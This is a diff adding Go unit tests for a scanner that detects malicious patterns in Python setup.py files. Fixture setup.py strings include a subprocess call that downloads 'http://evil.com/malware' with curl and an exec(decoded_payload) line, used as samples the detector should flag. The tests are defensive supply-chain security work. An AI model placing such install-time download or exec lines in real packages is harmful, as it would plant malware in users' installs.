@@ -2336,3 +2336,142 @@ if (!fs.existsSync(dest)) {
 		t.Errorf("Expected no patterns for clean script, got: %s", strings.Join(patternNames, ", "))
 	}
 }
+
+// Test: exec(open('version.py').read()) pattern is not flagged
+// Justification: This is a standard PyPA packaging idiom for reading version
+//                from a separate file during setup. It does not execute arbitrary
+//                or dynamically-constructed code — it reads a known local file.
+// Source: PyPA packaging documentation; widespread setuptools convention
+// Methodology: Pass setup.py with exec(open('version.py').read()) to AnalyzePythonSetup
+// Result: exec() pattern is filtered out entirely (not just downgraded)
+func TestAnalyzePythonSetup_ExecOpenVersionRead(t *testing.T) {
+	setupContent := `
+from setuptools import setup, find_packages
+
+exec(open('mypackage/version.py').read())
+
+setup(
+    name='mypackage',
+    version=__version__,
+    packages=find_packages(),
+)
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "exec()" {
+			t.Errorf("exec(open('version.py').read()) should not be flagged, got pattern %q with match %q", p.Pattern, p.Match)
+		}
+	}
+	if analysis.RiskLevel == "HIGH" {
+		t.Errorf("Expected non-HIGH risk for version-reading exec, got HIGH")
+	}
+}
+
+// Test: exec(open(...).read()) is filtered but exec() with other args is kept
+// Justification: Only the version-reading idiom is benign. exec() with dynamic
+//                content (variables, network data) remains a supply chain risk.
+// Source: "Backstabber's Knife Collection" (Ohm et al., 2020)
+// Methodology: Pass setup.py with both benign and malicious exec() calls
+// Result: Benign exec(open(...).read()) filtered; malicious exec(payload) kept
+func TestAnalyzePythonSetup_ExecOpenFiltered_ExecPayloadKept(t *testing.T) {
+	setupContent := `
+from setuptools import setup
+
+exec(open('version.py').read())
+exec(decoded_payload)
+
+setup(name='evil')
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	foundMaliciousExec := false
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "exec()" && strings.Contains(p.Match, "decoded_payload") {
+			foundMaliciousExec = true
+		}
+		if p.Pattern == "exec()" && strings.Contains(p.Match, "open(") {
+			t.Errorf("exec(open('version.py').read()) should have been filtered out, got match: %s", p.Match)
+		}
+	}
+	if !foundMaliciousExec {
+		// Debug: print what patterns we do have
+		for _, p := range analysis.DangerousPatterns {
+			t.Logf("Found pattern: %s, match: %s", p.Pattern, p.Match)
+		}
+		t.Errorf("exec(decoded_payload) should still be flagged as dangerous")
+	}
+}
+
+// Test: Flagged patterns include line numbers in Match field
+// Justification: When a setup.py IS flagged, evidence should include the actual
+//                concerning line for easy remediation and manual review.
+// Source: OSSF Scorecard methodology — actionable evidence in findings
+// Methodology: Pass setup.py with a dangerous pattern and check Match field format
+// Result: Match field contains "Line N: <actual code line>"
+func TestAnalyzePythonSetup_MatchFieldContainsLineNumber(t *testing.T) {
+	setupContent := `from setuptools import setup
+import subprocess
+
+subprocess.call(["curl", "-o", "/tmp/payload", "http://evil.com/malware"])
+
+setup(name='evil')
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	foundLineRef := false
+	for _, p := range analysis.DangerousPatterns {
+		if strings.HasPrefix(p.Match, "Line ") {
+			foundLineRef = true
+			// Should reference the actual line content
+			if !strings.Contains(p.Match, "curl") && !strings.Contains(p.Match, "subprocess") {
+				t.Errorf("Line reference should contain actual code, got: %s", p.Match)
+			}
+		}
+	}
+	if !foundLineRef {
+		patterns := []string{}
+		for _, p := range analysis.DangerousPatterns {
+			patterns = append(patterns, fmt.Sprintf("%s: %s", p.Pattern, p.Match))
+		}
+		t.Errorf("Expected at least one Match with 'Line N:' prefix, got: %s", strings.Join(patterns, "; "))
+	}
+}
+
+// Test: Generic *-config subprocess calls are recognized as build tools
+// Justification: Programs like mysql_config, pg_config, python-config, llvm-config
+//                are standard build configuration tools, not supply chain attack vectors.
+// Source: PyPA documentation on building C extensions; common build tool conventions
+// Methodology: Pass setup.py with various *-config calls in build context
+// Result: All *-config subprocess calls downgraded to LOW
+func TestAnalyzePythonSetup_GenericConfigToolPattern(t *testing.T) {
+	setupContent := `
+from setuptools import setup, Extension
+from setuptools.command.build_ext import build_ext
+import subprocess
+import os
+
+class MyBuild(build_ext):
+    def build_extensions(self):
+        pg_flags = subprocess.check_output(['pg_config', '--cflags'])
+        python_flags = os.popen('python-config --ldflags').read()
+        llvm_path = subprocess.check_output(['llvm-config', '--libdir'])
+        build_ext.build_extensions(self)
+
+setup(
+    name='myext',
+    ext_modules=[Extension('_myext', sources=['myext.c'])],
+    cmdclass={'build_ext': MyBuild},
+)
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	for _, p := range analysis.DangerousPatterns {
+		if p.Severity == "HIGH" {
+			t.Errorf("Build config tool pattern should not be HIGH: %s (match: %s)", p.Pattern, p.Match)
+		}
+	}
+	if analysis.RiskLevel == "HIGH" {
+		t.Errorf("Expected non-HIGH risk for *-config build tools, got HIGH")
+	}
+}
